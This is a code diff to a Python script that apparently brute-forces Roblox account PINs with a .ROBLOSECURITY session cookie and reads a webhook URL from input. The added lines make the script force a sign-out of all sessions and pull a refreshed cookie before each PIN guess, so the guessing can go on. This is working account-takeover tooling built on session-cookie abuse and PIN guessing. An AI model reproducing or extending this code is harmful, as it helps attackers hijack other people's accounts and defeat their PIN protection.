@@ -7780,6 +7780,7 @@ try:
   webhook = input()
   check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
   if check.status_code ==200:
+    cprint("Warning: You'll be logged out. This is done to make sure the cookie doesn't expire", 'red')
     for char in 'Cracking the pin....':
       time.sleep(0.1)
       cprint(char, 'magenta', end='', flush=True)
@@ -7793,6 +7794,19 @@ try:
           '.ROBLOSECURITY': cookie
       })
       return xsrfRequest.headers["x-csrf-token"]
+    def refresh(fname):
+      print(1)
+      cookies = {
+      '.ROBLOSECURITY': fname
+      }
+      headers = {
+      'X-CSRF-TOKEN': getXsrf(fname)
+      }
+      request = requests.post('https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate', cookies=cookies, headers=headers).headers['set-cookie']
+      request = request[request.index('.ROBLOSECURITY='):len(request)]
+      request = request[15:request.index(';')]
+      cprint(f'Refreshing cookie: {request}')
+      return request
     c = 0
     waitTime = 1
     while True:
@@ -7802,6 +7816,7 @@ try:
         v = f'0{v}'
       pin = str(v)[1:5]
       cprint(f"Trying {pin}")
+      cookie = refresh(cookie)
       cookies = {
       '.ROBLOSECURITY': cookie
       }
